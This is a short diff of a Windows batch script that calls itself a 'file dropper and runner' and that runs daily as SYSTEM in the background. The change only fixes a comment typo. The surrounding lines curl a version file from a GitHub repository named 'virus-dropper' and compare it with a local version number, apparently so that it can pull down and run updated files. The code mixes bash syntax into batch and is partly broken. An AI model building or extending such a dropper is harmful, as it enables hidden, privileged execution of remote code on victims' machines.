@@ -1,6 +1,6 @@
 @echo off
 ::file dropper and runner
-::this file is run daily as ADMINISTRATOR with highets elevation, under the name of SYSTEM, in BACKGROUND
+::this file is run daily as ADMINISTRATOR with highest elevation, under the name of SYSTEM, in BACKGROUND
 set /a version = 2
 output=$(curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Version.txt")
 If %output%>%version%
